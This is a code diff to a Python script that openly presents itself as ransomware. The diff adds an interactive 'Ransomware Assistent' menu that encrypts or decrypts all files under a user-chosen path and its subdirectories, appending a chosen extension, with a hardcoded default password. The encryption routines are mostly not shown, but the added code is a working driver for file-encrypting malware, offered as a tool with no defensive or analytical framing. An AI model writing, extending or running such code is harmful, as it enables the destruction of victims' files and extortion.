@@ -1,4 +1,5 @@
 import os
+import sys
 import base64
 
 def getListOfFiles(dirName):
@@ -105,6 +106,52 @@ def dransom(passw, ext, path):
             f.close()
         i += 1
 
-        
-ransom("1337", "smr", "./")    
-dransom("1337", "smr", "./") 
+def cli(recursion):
+    passw = "1337"
+    ext = "smr"
+    path = "./"
+    mode = "2"
+
+    if len(sys.argv) > 1 or recursion == "interactive":
+        i = 1
+        if recursion == "interactive":
+            i = 0
+        while i < len(sys.argv):
+            if sys.argv[i] == '--interactive' or sys.argv[i] == '-i':
+                mode = input(f"""Ransomware Assistent:
+Write the number matching the option:
+0 - Encrypt files.
+1 - Decrypt files.
+2 - Encrypt & Decrypt files. (only for debug)
+€ """)
+                ext = input(f"""Chose a string to append to encrypted files as extension.
+Example: helloWorld.html -> helloWorld.html.jaja
+To follow the example you ONLY write jaja
+Your extension name:
+€ """)
+                path = input(f"""Chose a path to encrypt all files. The subdirectories also get encrypted.
+To encrypt current folder and subfolder from where you are running the ransomware use write ./
+€ """)
+                passw = input(f"""Chose the password to encrypt the files. Can be any size. 
+Example: abc123
+€ """)
+            elif i == 0:
+                "first argument. Don't to go else"
+            else:
+                print(f"""Help menu: """)
+                return 0
+            i += 1
+    if mode == "0":
+        ransom(passw, ext, path)
+    elif mode == "1":
+        dransom(passw, ext, path)
+    elif mode == "2":
+        ransom(passw, ext, path)
+        dransom(passw, ext, path)
+    else:
+        cli("interactive")
+
+if len(sys.argv) == 1:
+    cli("interactive")
+else:
+    cli("default")
